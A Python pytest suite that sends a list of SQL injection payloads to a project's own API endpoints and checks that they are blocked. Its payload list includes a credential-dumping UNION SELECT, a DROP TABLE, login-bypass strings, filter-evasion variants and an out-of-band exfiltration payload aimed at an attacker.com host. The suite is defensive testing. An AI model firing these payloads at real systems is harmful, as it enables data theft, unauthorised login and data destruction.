"""
Comprehensive SQL Injection Protection Testing
Advanced SQL injection attack simulation and protection validation
covering all OWASP SQL injection attack vectors.
"""

import asyncio
import json
import logging
import os
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import quote, unquote

import pytest
import httpx
from fastapi.testclient import TestClient

# Import application components
from backend.api.main import app
from src.database.connection import get_database_connection
from src.database.models import Document, User

logger = logging.getLogger(__name__)


@dataclass
class SQLInjectionPayload:
    """SQL injection attack payload definition."""
    name: str
    description: str
    payload: str
    attack_type: str
    expected_blocked: bool
    severity: str
    target_parameter: str


class SQLInjectionTestSuite:
    """
    Comprehensive SQL injection testing suite covering all major attack vectors
    from the OWASP SQL injection testing guide.
    """
    
    def __init__(self):
        """Initialize SQL injection test suite."""
        self.client = TestClient(app)
        self.test_results = []
        self.blocked_attacks = 0
        self.successful_attacks = 0
        
        # Define comprehensive SQL injection payloads
        self.injection_payloads = self._get_injection_payloads()
        
        # Test endpoints that handle user input
        self.test_endpoints = [
            {"method": "GET", "url": "/api/documents", "param": "search"},
            {"method": "GET", "url": "/api/library/documents", "param": "filter"},
            {"method": "POST", "url": "/api/rag/query", "param": "query"},
            {"method": "GET", "url": "/api/system/health", "param": "component"},
            {"method": "POST", "url": "/api/auth/login", "param": "username"},
            {"method": "POST", "url": "/api/auth/login", "param": "password"},
        ]
    
    def _get_injection_payloads(self) -> List[SQLInjectionPayload]:
        """Get comprehensive list of SQL injection attack payloads."""
        return [
            # Basic SQL Injection
            SQLInjectionPayload(
                name="classic_union_select",
                description="Classic UNION SELECT attack",
                payload="' UNION SELECT username, password FROM users--",
                attack_type="union_based",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="boolean_blind_sql",
                description="Boolean-based blind SQL injection",
                payload="' AND (SELECT COUNT(*) FROM users) > 0--",
                attack_type="boolean_blind",
                expected_blocked=True,
                severity="high", 
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="time_based_blind",
                description="Time-based blind SQL injection",
                payload="'; WAITFOR DELAY '00:00:05'--",
                attack_type="time_blind",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="error_based_injection",
                description="Error-based SQL injection",
                payload="' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                attack_type="error_based",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            
            # Advanced SQL Injection Techniques
            SQLInjectionPayload(
                name="stacked_queries",
                description="Stacked queries injection",
                payload="'; DROP TABLE documents;--",
                attack_type="stacked_queries",
                expected_blocked=True,
                severity="critical",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="second_order_injection",
                description="Second-order SQL injection",
                payload="admin'; INSERT INTO users (username, password) VALUES ('hacker', 'pwd123');--",
                attack_type="second_order",
                expected_blocked=True,
                severity="high",
                target_parameter="username"
            ),
            SQLInjectionPayload(
                name="nosql_injection",
                description="NoSQL injection (if applicable)",
                payload="{'$where': 'this.username == \"admin\"'}",
                attack_type="nosql",
                expected_blocked=True,
                severity="medium",
                target_parameter="search"
            ),
            
            # Encoding and Obfuscation Techniques
            SQLInjectionPayload(
                name="hex_encoded_injection",
                description="Hex-encoded SQL injection",
                payload="0x27204f522031733120554e494f4e2053454c45435420757365726e616d652c70617373776f72642046524f4d2075736572732d2d",
                attack_type="encoded",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="unicode_injection",
                description="Unicode-encoded SQL injection",
                payload="\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u0020\u0055\u004e\u0049\u004f\u004e\u0020\u0053\u0045\u004c\u0045\u0043\u0054\u0020\u002a\u0020\u0046\u0052\u004f\u004d\u0020\u0075\u0073\u0065\u0072\u0073\u002d\u002d",
                attack_type="encoded",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="url_encoded_injection",
                description="URL-encoded SQL injection",
                payload="%27%20OR%201%3D1%20UNION%20SELECT%20*%20FROM%20users--",
                attack_type="encoded",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            
            # Database-Specific Injections
            SQLInjectionPayload(
                name="sqlite_injection",
                description="SQLite-specific injection",
                payload="' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
                attack_type="db_specific",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="postgresql_injection", 
                description="PostgreSQL-specific injection",
                payload="'; SELECT version();--",
                attack_type="db_specific",
                expected_blocked=True,
                severity="medium",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="mysql_injection",
                description="MySQL-specific injection",
                payload="' UNION SELECT @@version, user(), database()--",
                attack_type="db_specific",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            
            # Bypassing WAF/Filters
            SQLInjectionPayload(
                name="comment_obfuscation",
                description="Comment-based filter bypass",
                payload="'/**/UNION/**/SELECT/**/username,/**/password/**/FROM/**/users--",
                attack_type="bypass",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="case_variation",
                description="Case variation bypass",
                payload="' uNiOn SeLeCt username, password FrOm users--",
                attack_type="bypass",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="whitespace_bypass",
                description="Whitespace variation bypass", 
                payload="'\t\r\nUNION\t\r\nSELECT\t\r\nusername,password\t\r\nFROM\t\r\nusers--",
                attack_type="bypass",
                expected_blocked=True,
                severity="high",
                target_parameter="search"
            ),
            
            # Logic-based Attacks
            SQLInjectionPayload(
                name="auth_bypass_or",
                description="Authentication bypass using OR",
                payload="admin' OR '1'='1",
                attack_type="logic_bypass",
                expected_blocked=True,
                severity="critical",
                target_parameter="username"
            ),
            SQLInjectionPayload(
                name="auth_bypass_comment",
                description="Authentication bypass using comments",
                payload="admin'--",
                attack_type="logic_bypass",
                expected_blocked=True,
                severity="critical",
                target_parameter="username"
            ),
            
            # Out-of-Band Techniques
            SQLInjectionPayload(
                name="oob_dns_exfiltration",
                description="Out-of-band DNS data exfiltration",
                payload="'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\share'));--",
                attack_type="out_of_band",
                expected_blocked=True,
                severity="critical",
                target_parameter="search"
            ),
            
            # Benign Test Cases (should NOT be blocked)
            SQLInjectionPayload(
                name="legitimate_apostrophe",
                description="Legitimate use of apostrophe",
                payload="O'Connor's research paper",
                attack_type="benign",
                expected_blocked=False,
                severity="none",
                target_parameter="search"
            ),
            SQLInjectionPayload(
                name="legitimate_quotes",
                description="Legitimate quoted text",
                payload='The paper titled "Advanced AI Techniques"',
                attack_type="benign",
                expected_blocked=False,
                severity="none",
                target_parameter="search"
            )
        ]
    
    async def test_endpoint_with_payload(
        self,
        endpoint: Dict[str, str],
        payload: SQLInjectionPayload
    ) -> Dict[str, Any]:
        """Test a specific endpoint with an SQL injection payload."""
        
        test_start = time.time()
        result = {
            "endpoint": f"{endpoint['method']} {endpoint['url']}",
            "parameter": endpoint['param'],
            "payload_name": payload.name,
            "payload": payload.payload,
            "attack_type": payload.attack_type,
            "severity": payload.severity,
            "expected_blocked": payload.expected_blocked,
            "actually_blocked": False,
            "response_time_ms": 0,
            "error_detected": False,
            "response_code": 0,
            "response_body": "",
            "security_headers_present": False
        }
        
        try:
            # Prepare request based on method and parameter
            if endpoint['method'] == "GET":
                # GET request with query parameter
                params = {endpoint['param']: payload.payload}
                response = self.client.get(endpoint['url'], params=params)
                
            elif endpoint['method'] == "POST":
                if endpoint['param'] in ['username', 'password']:
                    # POST login request
                    data = {
                        'username': payload.payload if endpoint['param'] == 'username' else 'test_user',
                        'password': payload.payload if endpoint['param'] == 'password' else 'test_pass'
                    }
                    response = self.client.post(endpoint['url'], json=data)
                else:
                    # POST with JSON body
                    data = {endpoint['param']: payload.payload}
                    response = self.client.post(endpoint['url'], json=data)
            
            result["response_time_ms"] = (time.time() - test_start) * 1000
            result["response_code"] = response.status_code
            result["response_body"] = response.text[:500]  # Limit response body size
            
            # Check security headers
            security_headers = ['X-Content-Type-Options', 'X-Frame-Options', 'X-XSS-Protection']
            result["security_headers_present"] = any(header in response.headers for header in security_headers)
            
            # Determine if attack was blocked
            result["actually_blocked"] = self._is_attack_blocked(response, payload)
            result["error_detected"] = response.status_code >= 400
            
            # Log suspicious responses for manual review
            if not result["actually_blocked"] and payload.expected_blocked:
                logger.warning(f"Potential SQL injection bypass: {payload.name} on {endpoint['url']}")
                logger.warning(f"Response: {response.status_code} - {response.text[:200]}")
            
        except Exception as e:
            result["error_detected"] = True
            result["response_body"] = str(e)
            logger.error(f"Error testing {payload.name} on {endpoint['url']}: {e}")
        
        return result
    
    def _is_attack_blocked(self, response: httpx.Response, payload: SQLInjectionPayload) -> bool:
        """Determine if an SQL injection attack was successfully blocked."""
        
        # Check for explicit rejection status codes
        if response.status_code in [400, 403, 422, 429]:
            return True
        
        # Check for generic error responses that might indicate blocking
        if response.status_code >= 500:
            return True
        
        # Check response body for security-related error messages
        response_text = response.text.lower()
        security_keywords = [
            'sql injection',
            'invalid input',
            'security violation',
            'malicious request',
            'blocked',
            'forbidden',
            'suspicious activity'
        ]
        
        if any(keyword in response_text for keyword in security_keywords):
            return True
        
        # Check for database error messages that might indicate failed injection
        db_error_keywords = [
            'sql syntax error',
            'database error',
            'query failed',
            'syntax error',
            'malformed query'
        ]
        
        if any(keyword in response_text for keyword in db_error_keywords):
            return True
        
        # For benign payloads, success responses indicate proper handling
        if payload.attack_type == "benign" and 200 <= response.status_code < 300:
            return False  # Benign request should not be blocked
        
        # Check for suspicious data in response that might indicate successful injection
        suspicious_patterns = [
            'username',
            'password',
            'admin',
            'root',
            'version()',
            'information_schema',
            'sqlite_master'
        ]
        
        # If response contains suspicious patterns and status is success, injection might have succeeded
        if (200 <= response.status_code < 300 and 
            any(pattern in response_text for pattern in suspicious_patterns) and
            payload.attack_type != "benign"):
            return False  # Injection may have succeeded
        
        # Default: assume blocked if not clearly successful
        return True
    
    async def run_comprehensive_sql_injection_tests(self) -> Dict[str, Any]:
        """Run comprehensive SQL injection tests against all endpoints."""
        logger.info("Starting comprehensive SQL injection testing")
        
        test_start_time = time.time()
        all_results = []
        
        # Test each payload against each endpoint
        for endpoint in self.test_endpoints:
            for payload in self.injection_payloads:
                result = await self.test_endpoint_with_payload(endpoint, payload)
                all_results.append(result)
                
                # Update counters
                if payload.expected_blocked and result["actually_blocked"]:
                    self.blocked_attacks += 1
                elif not payload.expected_blocked and not result["actually_blocked"]:
                    self.blocked_attacks += 1  # Correctly handled benign request
                else:
                    self.successful_attacks += 1
        
        # Calculate statistics
        total_tests = len(all_results)
        protection_rate = (self.blocked_attacks / total_tests) * 100 if total_tests > 0 else 0
        
        # Categorize results by attack type
        attack_type_stats = {}
        for result in all_results:
            attack_type = result["attack_type"]
            if attack_type not in attack_type_stats:
                attack_type_stats[attack_type] = {"total": 0, "blocked": 0}
            
            attack_type_stats[attack_type]["total"] += 1
            if result["actually_blocked"] == result["expected_blocked"]:
                attack_type_stats[attack_type]["blocked"] += 1
        
        # Calculate protection rate by attack type
        for attack_type in attack_type_stats:
            stats = attack_type_stats[attack_type]
            stats["protection_rate"] = (stats["blocked"] / stats["total"]) * 100
        
        # Identify critical vulnerabilities
        critical_vulnerabilities = [
            result for result in all_results
            if (result["severity"] in ["critical", "high"] and
                result["expected_blocked"] and
                not result["actually_blocked"])
        ]
        
        test_summary = {
            "sql_injection_test_summary": {
                "total_tests": total_tests,
                "attacks_blocked": self.blocked_attacks,
                "attacks_succeeded": self.successful_attacks,
                "overall_protection_rate": protection_rate,
                "test_duration_seconds": time.time() - test_start_time,
                "test_timestamp": datetime.utcnow().isoformat(),
                "attack_type_breakdown": attack_type_stats,
                "critical_vulnerabilities_count": len(critical_vulnerabilities),
                "endpoints_tested": len(self.test_endpoints),
                "payloads_tested": len(self.injection_payloads)
            },
            "detailed_results": all_results,
            "critical_vulnerabilities": critical_vulnerabilities
        }
        
        return test_summary


@pytest.mark.asyncio
@pytest.mark.security
class TestSQLInjectionComprehensive:
    """Comprehensive SQL injection protection testing."""
    
    @pytest.fixture(autouse=True)
    async def setup_sql_injection_test(self):
        """Set up SQL injection testing environment."""
        self.test_suite = SQLInjectionTestSuite()
        yield
    
    async def test_union_based_sql_injection_protection(self):
        """Test protection against UNION-based SQL injection."""
        logger.info("Testing UNION-based SQL injection protection")
        
        union_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "union_based"]
        
        for payload in union_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Union-based attacks should be blocked
                assert result["actually_blocked"], f"UNION injection not blocked: {payload.name} on {endpoint['url']}"
        
        logger.info("UNION-based SQL injection protection test PASSED")
    
    async def test_boolean_blind_sql_injection_protection(self):
        """Test protection against boolean-based blind SQL injection."""
        logger.info("Testing boolean-based blind SQL injection protection")
        
        blind_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "boolean_blind"]
        
        for payload in blind_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Boolean blind attacks should be blocked
                assert result["actually_blocked"], f"Boolean blind injection not blocked: {payload.name} on {endpoint['url']}"
        
        logger.info("Boolean-based blind SQL injection protection test PASSED")
    
    async def test_time_based_sql_injection_protection(self):
        """Test protection against time-based SQL injection."""
        logger.info("Testing time-based SQL injection protection")
        
        time_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "time_blind"]
        
        for payload in time_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Time-based attacks should be blocked
                assert result["actually_blocked"], f"Time-based injection not blocked: {payload.name} on {endpoint['url']}"
                
                # Response should be fast (not delayed by injection)
                assert result["response_time_ms"] < 1000, f"Potential time-based injection success: {result['response_time_ms']}ms delay"
        
        logger.info("Time-based SQL injection protection test PASSED")
    
    async def test_stacked_queries_protection(self):
        """Test protection against stacked queries injection."""
        logger.info("Testing stacked queries injection protection")
        
        stacked_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "stacked_queries"]
        
        for payload in stacked_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Stacked queries should be blocked (critical security issue)
                assert result["actually_blocked"], f"CRITICAL: Stacked queries not blocked: {payload.name} on {endpoint['url']}"
        
        logger.info("Stacked queries injection protection test PASSED")
    
    async def test_encoding_bypass_protection(self):
        """Test protection against encoding-based bypass attempts."""
        logger.info("Testing encoding-based bypass protection")
        
        encoded_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "encoded"]
        
        for payload in encoded_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Encoded injections should be blocked
                assert result["actually_blocked"], f"Encoded injection bypass: {payload.name} on {endpoint['url']}"
        
        logger.info("Encoding-based bypass protection test PASSED")
    
    async def test_waf_bypass_protection(self):
        """Test protection against WAF/filter bypass techniques."""
        logger.info("Testing WAF bypass protection")
        
        bypass_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "bypass"]
        
        for payload in bypass_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Bypass attempts should be blocked
                assert result["actually_blocked"], f"WAF bypass successful: {payload.name} on {endpoint['url']}"
        
        logger.info("WAF bypass protection test PASSED")
    
    async def test_authentication_bypass_protection(self):
        """Test protection against SQL injection authentication bypass."""
        logger.info("Testing authentication bypass protection")
        
        auth_bypass_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "logic_bypass"]
        
        for payload in auth_bypass_payloads:
            # Focus on authentication endpoints
            auth_endpoints = [e for e in self.test_suite.test_endpoints if "auth" in e["url"]]
            
            for endpoint in auth_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Authentication bypass should be blocked (critical)
                assert result["actually_blocked"], f"CRITICAL: Auth bypass not blocked: {payload.name} on {endpoint['url']}"
        
        logger.info("Authentication bypass protection test PASSED")
    
    async def test_benign_input_handling(self):
        """Test that benign inputs are not incorrectly blocked."""
        logger.info("Testing benign input handling")
        
        benign_payloads = [p for p in self.test_suite.injection_payloads if p.attack_type == "benign"]
        
        for payload in benign_payloads:
            for endpoint in self.test_suite.test_endpoints:
                result = await self.test_suite.test_endpoint_with_payload(endpoint, payload)
                
                # Benign inputs should NOT be blocked
                assert not result["actually_blocked"], f"Benign input incorrectly blocked: {payload.name} on {endpoint['url']}"
        
        logger.info("Benign input handling test PASSED")


@pytest.mark.asyncio
async def test_complete_sql_injection_protection():
    """Run complete SQL injection protection test suite."""
    logger.info("Starting complete SQL injection protection testing")
    
    # Initialize test suite
    test_suite = SQLInjectionTestSuite()
    
    # Run comprehensive tests
    results = await test_suite.run_comprehensive_sql_injection_tests()
    
    # Save detailed results
    results_file = "performance_results/sql_injection_test_results.json"
    os.makedirs(os.path.dirname(results_file), exist_ok=True)
    with open(results_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    # Validate results
    summary = results["sql_injection_test_summary"]
    
    # Require >95% protection rate
    assert summary["overall_protection_rate"] >= 95.0, f"SQL injection protection rate too low: {summary['overall_protection_rate']:.1f}%"
    
    # No critical vulnerabilities allowed
    assert summary["critical_vulnerabilities_count"] == 0, f"Critical SQL injection vulnerabilities found: {summary['critical_vulnerabilities_count']}"
    
    # Validate specific attack type protection
    for attack_type, stats in summary["attack_type_breakdown"].items():
        if attack_type != "benign":  # Benign inputs should pass through
            assert stats["protection_rate"] >= 90.0, f"Low protection rate for {attack_type}: {stats['protection_rate']:.1f}%"
    
    logger.info(f"Complete SQL injection protection testing PASSED")
    logger.info(f"Protection rate: {summary['overall_protection_rate']:.1f}%")
    logger.info(f"Tests completed: {summary['total_tests']}")
    logger.info(f"Critical vulnerabilities: {summary['critical_vulnerabilities_count']}")
    logger.info(f"Results saved to: {results_file}")
    
    return results


if __name__ == "__main__":
    """Run SQL injection tests standalone."""
    import asyncio
    
    async def main():
        results = await test_complete_sql_injection_protection()
        print(f"SQL Injection Protection Rate: {results['sql_injection_test_summary']['overall_protection_rate']:.1f}%")
        return results
    
    asyncio.run(main())